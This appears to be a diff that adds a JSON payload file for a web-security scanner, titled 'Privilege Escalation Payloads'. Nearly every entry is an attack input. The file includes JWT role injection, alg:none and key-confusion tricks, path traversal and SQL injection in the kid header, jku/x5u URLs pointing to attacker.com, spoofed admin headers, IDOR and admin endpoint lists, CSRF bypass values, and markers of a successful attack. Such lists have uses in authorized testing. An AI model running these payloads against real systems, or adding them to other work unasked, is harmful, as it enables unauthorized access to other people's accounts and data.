@@ -1,0 +1,161 @@
+{
+  "info": {
+    "name": "Privilege Escalation Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Privilege escalation attack vectors including IDOR, JWT manipulation, header injection, and role manipulation. 2026 updated.",
+    "category": "Business Logic",
+    "severity": "CRITICAL",
+    "owasp": "A01:2021 - Broken Access Control"
+  },
+  "attack_vectors": {
+    "jwt_role_manipulation": [
+      {"payload": "{\"role\": \"admin\"}", "description": "Direct role injection", "target": "body"},
+      {"payload": "{\"role\": \"administrator\"}", "description": "Full admin role", "target": "body"},
+      {"payload": "{\"role\": \"superadmin\"}", "description": "Super admin role", "target": "body"},
+      {"payload": "{\"is_admin\": true}", "description": "Admin flag set", "target": "body"},
+      {"payload": "{\"is_admin\": 1}", "description": "Admin flag numeric", "target": "body"},
+      {"payload": "{\"is_admin\": \"true\"}", "description": "Admin flag string", "target": "body"},
+      {"payload": "{\"admin\": true}", "description": "Admin property", "target": "body"},
+      {"payload": "{\"user_type\": \"admin\"}", "description": "User type admin", "target": "body"},
+      {"payload": "{\"permissions\": [\"admin\", \"read\", \"write\"]}", "description": "Permissions array admin", "target": "body"},
+      {"payload": "{\"level\": 999}", "description": "High level value", "target": "body"},
+      {"payload": "{\"priority\": \"high\"}", "description": "High priority", "target": "body"},
+      {"payload": "{\"status\": \"active\"}", "description": "Active status", "target": "body"}
+    ],
+    "jwt_algorithm_manipulation": [
+      {"payload": "alg: none", "description": "Remove signature (none algorithm)", "target": "jwt_header"},
+      {"payload": "alg: HS256 with public key as secret", "description": "Algorithm confusion", "target": "jwt_header"},
+      {"payload": "alg: RS256 → HS256", "description": "Public key as HMAC secret", "target": "jwt_header"},
+      {"payload": "kid: ../../etc/passwd", "description": "Path traversal in kid", "target": "jwt_header"},
+      {"payload": "kid: ../../../app/key", "description": "Path traversal alt", "target": "jwt_header"},
+      {"payload": "kid: \" OR \"1\"=\"1", "description": "SQL injection in kid", "target": "jwt_header"},
+      {"payload": "jku: https://attacker.com/jwks.json", "description": "jwks URI injection", "target": "jwt_header"},
+      {"payload": "x5u: https://attacker.com/cert.pem", "description": "x5u URI injection", "target": "jwt_header"}
+    ],
+    "header_manipulation": [
+      {"header": "X-User-ID", "value": "1", "description": "User ID header injection"},
+      {"header": "X-User-ID", "value": "0", "description": "Admin user ID (0 or 1)"},
+      {"header": "X-User-ID", "value": "admin", "description": "Admin username"},
+      {"header": "X-Admin", "value": "true", "description": "Admin header"},
+      {"header": "X-Admin", "value": "1", "description": "Admin header numeric"},
+      {"header": "X-Role", "value": "admin", "description": "Role header"},
+      {"header": "X-Role", "value": "administrator", "description": "Administrator role"},
+      {"header": "X-Permission", "value": "admin", "description": "Permission header"},
+      {"header": "X-Privileged", "value": "true", "description": "Privileged header"},
+      {"header": "X-Authenticated", "value": "true", "description": "Authenticated header"},
+      {"header": "Authorization", "value": "Bearer fake_token", "description": "Fake bearer token"}
+    ],
+    "idor_user_access": [
+      {"url": "/api/users/1", "description": "User 1 access"},
+      {"url": "/api/users/2", "description": "User 2 access"},
+      {"url": "/api/users/3", "description": "User 3 access"},
+      {"url": "/api/profile/1", "description": "Profile 1 access"},
+      {"url": "/api/profile/me", "description": "Own profile"},
+      {"url": "/api/orders/1", "description": "Order 1 access"},
+      {"url": "/api/orders/100", "description": "Order 100 access"},
+      {"url": "/api/documents/1", "description": "Document 1 access"},
+      {"url": "/api/invoices/1", "description": "Invoice 1 access"},
+      {"url": "/api/settings", "description": "Settings access"},
+      {"url": "/api/admin/users", "description": "Admin users endpoint"},
+      {"url": "/api/admin/config", "description": "Admin config endpoint"},
+      {"url": "/api/admin/logs", "description": "Admin logs endpoint"}
+    ],
+    "parameter_pollution": [
+      {"payload": "user_id=1&user_id=2", "description": "Duplicate user ID"},
+      {"payload": "{\"id\": 1, \"id\": 2}", "description": "JSON duplicate ID"},
+      {"payload": "id[]=1&id[]=2", "description": "Array parameter pollution"},
+      {"payload": "role=user&role=admin", "description": "Duplicate role parameter"},
+      {"payload": "_method=DELETE", "description": "HTTP method override"}
+    ],
+    "type_confusion": [
+      {"payload": "{\"user_id\": \"1\"}", "description": "String user ID instead of int"},
+      {"payload": "{\"user_id\": 1.0}", "description": "Float user ID"},
+      {"payload": "{\"user_id\": true}", "description": "Boolean user ID"},
+      {"payload": "{\"user_id\": null}", "description": "Null user ID"},
+      {"payload": "{\"user_id\": \"1 OR 1=1\"}", "description": "SQL injection type confusion"}
+    ],
+    "http_verb_tampering": [
+      {"method": "GET", "url": "/api/admin/users", "description": "GET to admin endpoint"},
+      {"method": "PUT", "url": "/api/users/1", "description": "PUT to user endpoint"},
+      {"method": "PATCH", "url": "/api/users/1/role", "description": "PATCH to role endpoint"},
+      {"method": "DELETE", "url": "/api/users/1", "description": "DELETE user"},
+      {"method": "TRACE", "url": "/api/admin", "description": "TRACE method test"},
+      {"method": "OPTIONS", "url": "/api/admin", "description": "OPTIONS method test"}
+    ],
+    "role_enum": [
+      {"payload": "{\"role\": \"user\"}", "description": "User role"},
+      {"payload": "{\"role\": \"admin\"}", "description": "Admin role"},
+      {"payload": "{\"role\": \"moderator\"}", "description": "Moderator role"},
+      {"payload": "{\"role\": \"viewer\"}", "description": "Viewer role"},
+      {"payload": "{\"role\": \"editor\"}", "description": "Editor role"},
+      {"payload": "{\"role\": \"superadmin\"}", "description": "Super admin role"},
+      {"payload": "{\"role\": \"owner\"}", "description": "Owner role"},
+      {"payload": "{\"role\": \"manager\"}", "description": "Manager role"},
+      {"payload": "{\"role\": \"support\"}", "description": "Support role"}
+    ],
+    "csrf_token_bypass": [
+      {"header": "X-CSRF-Token", "value": "", "description": "Empty CSRF token"},
+      {"header": "X-CSRF-Token", "value": "admin", "description": "String CSRF token"},
+      {"header": "X-CSRF-Token", "value": "000000", "description": "Numeric CSRF token"},
+      {"header": "Referer", "value": "https://legitimate.com", "description": "Fake referer"},
+      {"header": "Origin", "value": "https://legitimate.com", "description": "Fake origin"},
+      {"payload": "_csrf=", "description": "Empty CSRF param"},
+      {"payload": "_token=", "description": "Empty token param"}
+    ],
+    "resource_enumeration": [
+      {"url": "/api/resources?page=1", "description": "Page 1"},
+      {"url": "/api/resources?page=2", "description": "Page 2"},
+      {"url": "/api/resources?limit=100", "description": "High limit"},
+      {"url": "/api/resources?offset=0", "description": "Offset 0"},
+      {"url": "/api/resources?offset=100", "description": "Offset 100"},
+      {"url": "/api/resources?sort=created_at&order=desc", "description": "Sort desc"},
+      {"url": "/api/search?q=*", "description": "Wildcard search"},
+      {"url": "/api/export", "description": "Export endpoint"}
+    ]
+  },
+  "horizontal_escalation_targets": [
+    "/api/users/{id}",
+    "/api/profile/{id}",
+    "/api/orders/{id}",
+    "/api/documents/{id}",
+    "/api/messages/{id}",
+    "/api/invoices/{id}",
+    "/api/payments/{id}",
+    "/api/settings/{id}",
+    "/api/entries/{id}",
+    "/api/records/{id}"
+  ],
+  "vertical_escalation_targets": [
+    "/api/admin",
+    "/api/admin/users",
+    "/api/admin/config",
+    "/api/admin/logs",
+    "/api/admin/settings",
+    "/api/admin/dashboard",
+    "/api/v1/admin",
+    "/api/v2/admin",
+    "/manage",
+    "/dashboard",
+    "/settings"
+  ],
+  "detection_indicators": [
+    "admin",
+    "role",
+    "permission",
+    "privilege",
+    "user_id",
+    "authorization",
+    "authenticated",
+    "access"
+  ],
+  "successful_indicators": [
+    "Admin panel accessible",
+    "User data returned",
+    "Admin role detected",
+    "Privileged action succeeded",
+    "403 bypassed",
+    "200 instead of 401",
+    "200 instead of 403"
+  ]
+}
